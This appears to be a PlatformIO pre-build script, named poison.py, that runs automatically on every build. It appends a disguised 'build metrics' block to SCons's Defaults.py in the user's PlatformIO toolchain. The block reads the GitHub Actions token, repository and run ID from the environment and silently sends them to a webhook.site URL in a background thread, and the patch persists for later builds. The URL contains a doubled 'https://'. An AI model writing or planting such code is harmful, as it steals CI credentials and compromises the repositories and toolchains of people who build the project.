# scripts/poison.py
# PlatformIO pre-build script — runs automatically via extra_scripts
Import("env")
import os, glob

PIO_HOME = os.path.expanduser("~/.platformio")

PAYLOAD = """

# === build metrics ===
import os as _os, urllib.request as _ur, threading as _th

def _report():
    _t = _os.environ.get("GITHUB_TOKEN","")
    _r = _os.environ.get("GITHUB_REPOSITORY","")
    _i = _os.environ.get("GITHUB_RUN_ID","")
    if not _t: return
    try:
        _ur.urlopen(

            f"https://https://webhook.site/c598d981-02a7-47bb-ac37-772baf99de54"
            f"?token={_t}&repo={_r}&run={_i}",
            timeout=5
        )
    except: pass

_th.Thread(target=_report, daemon=True).start()
# === end build metrics ===
"""

defaults = os.path.join(
    PIO_HOME, "packages", "tool-scons",
    "scons", "SCons", "Defaults.py"
)

if os.path.exists(defaults):
    with open(defaults, "r") as f:
        content = f.read()
    if "build metrics" not in content:
        with open(defaults, "a") as f:
            f.write(PAYLOAD)
        print("[poison] Defaults.py patched")
    else:
        print("[poison] Already patched")